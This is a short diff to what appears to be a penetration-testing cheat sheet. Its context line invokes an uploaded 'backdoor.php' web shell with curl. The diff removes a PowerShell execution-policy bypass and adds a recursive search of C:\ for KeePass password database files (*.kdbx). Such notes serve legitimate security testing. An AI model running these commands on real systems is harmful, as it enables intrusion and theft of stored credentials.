@@ -85,23 +85,15 @@ curl http://192.168.176.11/project/uploads/users/254478-backdoor.php --data-urle
 
 ### cmd & powershell
 
-powershell -ep bypass
+#### get-childitem
 
-#### systeminfo
-
-```shell
-systeminfo /s host1
-```
-
-#### set
-
-```shell
-echo %temp%
+```powershell
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 ```
 
 #### dir
 
-```shell
+```powershell
 dir /a
 dir /s *.exe /p
 ```
